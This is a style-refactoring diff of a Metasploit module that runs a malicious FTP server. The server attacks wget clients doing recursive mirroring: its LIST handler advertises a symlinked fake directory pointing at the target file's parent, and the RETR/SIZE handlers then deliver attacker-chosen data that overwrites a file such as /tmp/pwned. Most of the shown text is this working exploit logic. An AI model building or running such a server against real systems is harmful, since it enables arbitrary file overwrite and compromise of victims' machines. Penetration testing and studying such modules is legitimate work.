@@ -1,14 +1,12 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'msf/core'
 
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::FtpServer
   include Msf::Auxiliary::Report
 
@@ -44,33 +42,34 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('TARGET_FILE', [ true,  "The target file to overwrite", '/tmp/pwned' ]),
         OptString.new('TARGET_DATA', [ true,  "The data to write to the target file", 'Hello from Metasploit' ]),
         OptPort.new('SRVPORT', [ true, "The port for the malicious FTP server to listen on", 2121])
-      ], self.class)
+      ], self.class
+    )
 
-      @fakedir = Rex::Text.rand_text_alphanumeric(rand(8)+8)
+    @fakedir = Rex::Text.rand_text_alphanumeric(rand(8) + 8)
   end
 
   def run
     my_address = Rex::Socket.source_address
     print_good("Targets should run: $ wget -m ftp://#{my_address}:#{datastore['SRVPORT']}/")
-    exploit()
+    exploit
   end
 
-  def on_client_command_user(c,arg)
+  def on_client_command_user(c, arg)
     @state[c][:user] = arg
     c.put "331 User name okay, need password...\r\n"
   end
 
-  def on_client_command_pass(c,arg)
+  def on_client_command_pass(c, arg)
     @state[c][:pass] = arg
     c.put "230 Login OK\r\n"
     @state[c][:auth] = true
     print_status("#{@state[c][:name]} Logged in with user '#{@state[c][:user]}' and password '#{@state[c][:user]}'...")
   end
 
-  def on_client_command_retr(c,arg)
+  def on_client_command_retr(c, arg)
     print_status("#{@state[c][:name]} -> RETR #{arg}")
 
-    if not @state[c][:auth]
+    unless @state[c][:auth]
       c.put "500 Access denied\r\n"
       return
     end
@@ -81,7 +80,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     conn = establish_data_connection(c)
-    if not conn
+    unless conn
       c.put("425 Can't build data connection\r\n")
       return
     end
@@ -94,17 +93,16 @@ class MetasploitModule < Msf::Auxiliary
     print_good("#{@state[c][:name]} Hopefully wrote #{datastore['TARGET_DATA'].length} bytes to #{datastore['TARGET_FILE']}")
   end
 
-  def on_client_command_list(c,arg)
-
+  def on_client_command_list(c, arg)
     print_status("#{@state[c][:name]} -> LIST #{arg}")
 
-    if not @state[c][:auth]
+    unless @state[c][:auth]
       c.put "500 Access denied\r\n"
       return
     end
 
     conn = establish_data_connection(c)
-    if not conn
+    unless conn
       c.put("425 Can't build data connection\r\n")
       return
     end
@@ -112,12 +110,12 @@ class MetasploitModule < Msf::Auxiliary
     pwd = @state[c][:cwd]
     buf = ''
 
-    dstamp = Time.at(Time.now.to_i-((3600*24*365)+(3600*24*(rand(365)+1)))).strftime("%b %e  %Y")
-    unless pwd.index(@fakedir)
+    dstamp = Time.at(Time.now.to_i - ((3600 * 24 * 365) + (3600 * 24 * (rand(365) + 1)))).strftime("%b %e  %Y")
+    if pwd.index(@fakedir)
+      buf << "-rwx------   1 root     root    #{'%9d' % datastore['TARGET_DATA'].length} #{dstamp} #{::File.basename(datastore['TARGET_FILE'])}\r\n"
+    else
       buf << "lrwxrwxrwx   1 root     root           33 #{dstamp} #{@fakedir} -> #{::File.dirname(datastore['TARGET_FILE'])}\r\n"
       buf << "drwxrwxr-x  15 root     root         4096 #{dstamp} #{@fakedir}\r\n"
-    else
-      buf << "-rwx------   1 root     root    #{"%9d" % datastore['TARGET_DATA'].length} #{dstamp} #{::File.basename(datastore['TARGET_FILE'])}\r\n"
     end
 
     c.put("150 Opening ASCII mode data connection for /bin/ls\r\n")
@@ -126,9 +124,8 @@ class MetasploitModule < Msf::Auxiliary
     conn.close
   end
 
-  def on_client_command_size(c,arg)
-
-    if not @state[c][:auth]
+  def on_client_command_size(c, _arg)
+    unless @state[c][:auth]
       c.put "500 Access denied\r\n"
       return
     end
@@ -136,12 +133,10 @@ class MetasploitModule < Msf::Auxiliary
     c.put("213 #{datastore['TARGET_DATA'].length}\r\n")
   end
 
-
-  def on_client_command_cwd(c,arg)
-
+  def on_client_command_cwd(c, arg)
     print_status("#{@state[c][:name]} -> CWD #{arg}")
 
-    if not @state[c][:auth]
+    unless @state[c][:auth]
       c.put "500 Access denied\r\n"
       return
     end
@@ -151,9 +146,7 @@ class MetasploitModule < Msf::Auxiliary
     bpath = npath[upath.length, npath.length - upath.length]
 
     # Check for traversal above the root directory
-    if not (npath[0, upath.length] == upath or bpath == '')
-      bpath = '/'
-    end
+    bpath = '/' unless (npath[0, upath.length] == upath) || (bpath == '')
 
     bpath = '/' if bpath == ''
     @state[c][:cwd] = bpath
